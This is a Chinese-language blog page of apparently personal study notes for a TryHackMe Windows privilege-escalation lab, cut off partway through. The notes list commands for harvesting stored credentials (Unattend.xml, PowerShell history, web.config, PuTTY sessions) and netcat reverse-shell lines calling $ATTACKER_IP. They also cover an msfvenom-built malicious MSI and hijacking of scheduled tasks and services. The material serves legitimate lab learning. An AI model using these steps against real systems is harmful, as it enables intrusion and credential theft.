@@ -1,0 +1,733 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="windows1xfreerdp &#x2F;dynamic-resolution +clipboard &#x2F;cert:ignore &#x2F;v:MACHINE_IP &#x2F;u:username &#x2F;p:&#x27;password&#x27;    &lt;&#x2F;d:域名&gt;  cmddir &#x2F;a:h 查看当前目录所有文件包括隐藏文件 1234567891011121314151617181920212223">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tryhackme_windows_提权">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2023/08/12/tryhackme-windows-%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="windows1xfreerdp &#x2F;dynamic-resolution +clipboard &#x2F;cert:ignore &#x2F;v:MACHINE_IP &#x2F;u:username &#x2F;p:&#x27;password&#x27;    &lt;&#x2F;d:域名&gt;  cmddir &#x2F;a:h 查看当前目录所有文件包括隐藏文件 1234567891011121314151617181920212223">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ws-%E6%8F%90%E6%9D%83/image-20231018162346580.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ws-%E6%8F%90%E6%9D%83/image-20231017014503241.png">
+<meta property="article:published_time" content="2023-08-12T10:59:26.000Z">
+<meta property="article:modified_time" content="2024-09-07T11:02:27.213Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ws-%E6%8F%90%E6%9D%83/image-20231018162346580.png">
+  
+  
+  
+  <title>tryhackme_windows_提权 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="tryhackme_windows_提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-12 18:59" pubdate>
+          2023年8月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">tryhackme_windows_提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:username /p:<span class="hljs-string">&#x27;password&#x27;</span>    &lt;/d:域名&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h5><p>dir &#x2F;a:h 查看当前目录所有文件包括隐藏文件</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">dir</span><span class="hljs-punctuation">:</span> <span class="hljs-string">列出当前目录下的文件和文件夹。</span><br><span class="hljs-attribute">cd</span><span class="hljs-punctuation">:</span> <span class="hljs-string">更改当前目录。</span><br><span class="hljs-attribute">cd &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">进入指定的目录。</span><br><span class="hljs-attribute">cd ..</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">返回上级目录。</span><br><span class="hljs-attribute">cd \</span><span class="hljs-punctuation">:</span> <span class="hljs-string">进入根目录。</span><br><span class="hljs-attribute">cd /d &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">在不同的驱动器之间切换目录。</span><br><span class="hljs-attribute">mkdir</span><span class="hljs-punctuation">:</span> <span class="hljs-string">创建一个新的目录。</span><br><span class="hljs-attribute">mkdir &lt;目录名称&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">创建一个指定名称的目录。</span><br><span class="hljs-attribute">del</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除文件。</span><br><span class="hljs-attribute">del &lt;文件路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除指定的文件。</span><br><span class="hljs-attribute">rd</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除目录。</span><br><span class="hljs-attribute">rd &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除空目录。</span><br><span class="hljs-attribute">rd /s /q &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除目录及其内容。</span><br><span class="hljs-attribute">ren</span><span class="hljs-punctuation">:</span> <span class="hljs-string">重命名文件或目录。</span><br><span class="hljs-attribute">ren &lt;原始名称&gt; &lt;新名称&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">将文件或目录重命名为新的名称。</span><br><span class="hljs-attribute">copy</span><span class="hljs-punctuation">:</span> <span class="hljs-string">复制文件。</span><br><span class="hljs-attribute">copy &lt;源文件路径&gt; &lt;目标文件路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">将源文件复制到目标位置。</span><br><span class="hljs-attribute">move</span><span class="hljs-punctuation">:</span> <span class="hljs-string">移动文件或将文件重命名并同时移动。</span><br><span class="hljs-attribute">move &lt;源路径&gt; &lt;目标路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">将文件或目录从源路径移动到目标路径，并可以同时重命名文件。</span><br><span class="hljs-attribute">type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示文件内容。</span><br><span class="hljs-attribute">type &lt;文件路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示指定文件的内容。</span><br><span class="hljs-attribute">ping</span><span class="hljs-punctuation">:</span> <span class="hljs-string">测试与另一个主机的网络连接。</span><br><span class="hljs-attribute">ping &lt;IP地址或主机名&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">发送网络请求以测试与目标主机的连通性。</span><br><span class="hljs-attribute">ipconfig</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示当前网络配置信息。</span><br><span class="hljs-attribute">tasklist</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示当前运行的进程列表。</span><br><span class="hljs-attribute">taskkill</span><span class="hljs-punctuation">:</span> <span class="hljs-string">终止正在运行的进程。</span><br><span class="hljs-attribute">taskkill /im &lt;进程名&gt;.exe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">终止指定名称的进程。</span><br><span class="hljs-attribute">systeminfo</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示系统信息，如操作系统版本、安装日期等。</span><br><span class="hljs-attribute">sfc /scannow</span><span class="hljs-punctuation">:</span> <span class="hljs-string">扫描并修复系统文件错误。</span><br><span class="hljs-attribute">shutdown</span><span class="hljs-punctuation">:</span> <span class="hljs-string">关闭或重启计算机。</span><br><span class="hljs-attribute">shutdown /s</span><span class="hljs-punctuation">:</span> <span class="hljs-string">关闭计算机。</span><br><span class="hljs-attribute">shutdown /r</span><span class="hljs-punctuation">:</span> <span class="hljs-string">重启计算机。</span><br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;查找文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /s C:\$路径\flag*   C盘某路径中递归寻找flag*<br><br><span class="hljs-built_in">dir</span> &lt;目录路径&gt;: 列出指定目录下的文件和文件夹。<br><span class="hljs-built_in">dir</span> &lt;文件名或通配符&gt;: 根据文件名或通配符进行筛选，例如：<span class="hljs-built_in">dir</span> *.txt会列出所有扩展名为txt的文件。<br>tree: 使用tree命令可以以树状结构显示指定目录下的所有子文件夹和文件。<br>tree &lt;目录路径&gt;: 显示指定目录及其子目录下的文件和文件夹的树状结构。<br><br>//cmd中find不是用来找文件的，是来找字符串的<br>find: 使用find命令可以在文本文件中搜索指定的字符串。<br>find <span class="hljs-string">&quot;&lt;字符串&gt;&quot;</span> &lt;文件路径&gt;: 在指定的文本文件中搜索包含指定字符串的行。<br><br><span class="hljs-built_in">where</span>: 使用<span class="hljs-built_in">where</span>命令可以查找指定程序或命令的执行路径。<br><span class="hljs-built_in">where</span> &lt;命令或程序名称&gt;: 显示与指定名称匹配的可执行文件路径。<br><br>xcopy: 使用xcopy命令可以复制文件和目录，并且可以通过/s选项来递归搜索。<br>xcopy /s &lt;源路径&gt; &lt;目标路径&gt;: 递归地复制源路径中所有文件和文件夹到目标路径。<br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;默认的桌面路径通常是<code>C:\Users\&lt;用户名&gt;\Desktop</code></p>
+<p>&#x2F;&#x2F;弹shell c:\tools\nc64.exe -e cmd.exe $ATTACKER_IP 4444</p>
+<h5 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h5><h6 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /user: 显示当前登录用户的完整用户信息，包括用户名、本地组和域成员身份等。<br><span class="hljs-built_in">whoami</span> /groups: 显示当前用户所属的所有组信息。<br><span class="hljs-built_in">whoami</span> /priv: 显示当前用户的权限信息。<br></code></pre></td></tr></table></figure>
+
+<h6 id="初始配置文件"><a href="#初始配置文件" class="headerlink" title="初始配置文件"></a>初始配置文件</h6><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人参与安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，初始设置最终可能会存储在计算机中的以下位置：  这些文件中可能会包含初始的用户名密码<br>C:\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\system32\sysprep.<span class="hljs-literal">inf</span><br>C:\Windows\system32\sysprep\sysprep.xml<br></code></pre></td></tr></table></figure>
+
+<h6 id="powershell-history"><a href="#powershell-history" class="headerlink" title="powershell history"></a>powershell history</h6><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复以前使用过的命令很有用。可能用户在 Powershell 命令行中直接运行包含密码的命令<br>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br><br>The command <span class="hljs-keyword">above</span> will only work <span class="hljs-keyword">from</span> cmd.exe, <span class="hljs-keyword">as</span> Powershell won&#x27;t recognize <span class="hljs-keyword">as</span> an environment variable. To <span class="hljs-built_in">read</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">from</span> Powershell, you&#x27;d have <span class="hljs-keyword">to</span> replace <span class="hljs-keyword">with</span> . %userprofile%%userprofile%$Env:userprofile<br></code></pre></td></tr></table></figure>
+
+<h6 id="保存的用户凭据"><a href="#保存的用户凭据" class="headerlink" title="保存的用户凭据"></a>保存的用户凭据</h6><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Windows allows us <span class="hljs-keyword">to</span> use other users<span class="hljs-comment">&#x27; credentials. list saved credentials:</span><br>cmdkey /list<br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;尝试password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">runas /savecred /user:admin cmd.exe<br></code></pre></td></tr></table></figure>
+
+<h6 id="IIS配置"><a href="#IIS配置" class="headerlink" title="IIS配置"></a>IIS配置</h6><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\Config\web.config | findstr connectionString<br>或者这个路径：<span class="hljs-name">C</span>:\inetpub\wwwroot\web.config<br></code></pre></td></tr></table></figure>
+
+<h6 id="如果安装了PuTTY"><a href="#如果安装了PuTTY" class="headerlink" title="如果安装了PuTTY"></a>如果安装了PuTTY</h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ <span class="hljs-string">/f</span> <span class="hljs-string">&quot;Proxy&quot;</span> <span class="hljs-string">/s</span><br><span class="hljs-string">//Simon</span> Tatham是PuTTY的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。<br>正如 putty 存储凭据一样，任何存储密码的软件（包括浏览器、电子邮件客户端、FTP 客户端、SSH 客户端、VNC 软件等）都将具有恢复用户保存的任何密码的方法。<br></code></pre></td></tr></table></figure>
+
+<h6 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h6><h6 id="powerup-ps1"><a href="#powerup-ps1" class="headerlink" title="powerup.ps1"></a>powerup.ps1</h6><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1669640">https://cloud.tencent.com/developer/article/1669640</a></p>
+<h5 id="快速提权"><a href="#快速提权" class="headerlink" title="快速提权"></a>快速提权</h5><h6 id="Scheduled-Tasks计划任务"><a href="#Scheduled-Tasks计划任务" class="headerlink" title="Scheduled Tasks计划任务"></a>Scheduled Tasks计划任务</h6><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta">#schtasks</span><br>出来一大堆，肉眼排除系统自带的计划任务，找到一个看起来像人为自定义的Taskname<br><span class="hljs-comment">//这个命令用于查询计划任务详细信息</span><br><span class="hljs-meta">#schtasks /query /tn $Taskname /fo list /v</span><br>输出了该计划任务所需可执行文件的存储目录，比如说C:\tasks\schtask.bat<br><span class="hljs-comment">//检查该可执行文件的权限</span><br><span class="hljs-meta">#icacls c:\tasks\schtask.bat</span><br><span class="hljs-symbol">c:</span>\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)<br>                    BUILTIN\Administrators:(I)(F)<br>                    BUILTIN\Users:(I)(F)<br><span class="hljs-comment">//BUILTIN\Users组(目前用户属于的组)对任务的二进制文件具有完全访问权限（F）。这意味着我们可以修改.bat文件并插入我们喜欢的任何payload。这里可以kali生成一个反弹shell,kali起smb服务，windows下载</span><br><span class="hljs-symbol">windows:</span><span class="hljs-meta">#echo c:\tools\nc64.exe -e cmd.exe $ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</span><br><span class="hljs-symbol">kali:</span><span class="hljs-meta">#nc -lvp 4444 <span class="hljs-comment">//开启监听</span></span><br><span class="hljs-comment">//不想等，手动激活计划任务</span><br><span class="hljs-meta">#schtasks /run /tn $taskname</span><br>得到shell <span class="hljs-meta">#dir /s C:\flag* 全局找flag</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h6><p>Windows 安装程序文件（也称为.msi文件）用于在系统上安装应用程序。</p>
+<p>可以将这些.msi配置为从任何用户帐户以更高的权限运行。</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">//配置两个注册表值，先看行不行，thm靶机就已经不支持了<br><span class="hljs-name">C</span>:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br><span class="hljs-name">C</span>:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure>
+
+<p>生成马</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=ATTACKING_10.10.156.205 <span class="hljs-attribute">LPORT</span>=LOCAL_PORT -f msi -o malicious.msi<br></code></pre></td></tr></table></figure>
+
+<p>smb上传略</p>
+<p>激活马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="windows服务"><a href="#windows服务" class="headerlink" title="windows服务"></a>windows服务</h5><h6 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h6><p>Windows 服务由<strong>服务控制管理器</strong> （SCM） 管理。</p>
+<p>每个服务都有一个关联的可执行文件，每当启动服务时，SCM 都会运行该可执行文件。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span>  <span class="hljs-comment">//查看所有服务</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ada">//查询特定服务<br>sc qc camsvc<br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: camsvc<br>        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">20</span>  WIN32_SHARE_PROCESS<br>        START_TYPE         : 3   <span class="hljs-type">DEMAND_START</span><br>        ERROR_CONTROL      : 1   <span class="hljs-type">NORMAL</span><br>        BINARY_PATH_NAME   : <span class="hljs-type">C</span>:\Windows\system32\svchost.exe -k appmodel -p<br>        LOAD_ORDER_GROUP   :<br>        <span class="hljs-type">TAG</span>                : 0<br>        DISPLAY_NAME       : <span class="hljs-type">Capability</span> <span class="hljs-keyword">Access</span> Manager Service<br>        DEPENDENCIES       :<br>        <span class="hljs-type">SERVICE_START_NAME</span> : <span class="hljs-type">LocalSystem</span><br></code></pre></td></tr></table></figure>
+
+<p>关联的可执行文件：<strong>BINARY_PATH_NAME</strong> </p>
+<p>用于运行服务的帐户： <strong>SERVICE_START_NAME</strong> </p>
+<p>win+R图形化注册表：服务的所有配置文件都放在：regedit    —》HKLM\SYSTEM\CurrentControlSet\Services\</p>
+<p>然后可以在<strong>ImagePath</strong> 值上看到关联的可执行文件，在 <strong>ObjectName</strong> 值上看到用于启动服务的帐户</p>
+<h6 id="通过服务提权："><a href="#通过服务提权：" class="headerlink" title="通过服务提权："></a><strong>通过服务提权</strong>：</h6><p>目前权限：wprivesc1\thm-unpriv</p>
+<p>通过sc query,发现了一堆服务，然后一个一个sc qc $服务名，大多数用于运行服务的帐户都是localsystem，但是找到了一个WindowsScheduler服务，用户为.\svcusr1  就提他。</p>
+<p>sc qc得到的信息还有关联的可执行文件路径C:\PROGRA<del>2\SYSTEM</del>1\WService.exe，于是icacls查看他的执行权限。</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">thm</span><span class="hljs-operator">-</span><span class="hljs-variable">unpriv</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">icacls</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PROGRA</span><span class="hljs-operator">~</span><span class="hljs-number">2</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>\<span class="hljs-variable">WService</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><br><span class="hljs-variable">icacls</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PROGRA</span><span class="hljs-operator">~</span><span class="hljs-number">2</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>\<span class="hljs-variable">WService</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><br><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PROGRA</span><span class="hljs-operator">~</span><span class="hljs-number">2</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>\<span class="hljs-variable">WService</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span> <span class="hljs-variable">Everyone</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">M</span><span class="hljs-punctuation">)</span><br>                                  <span 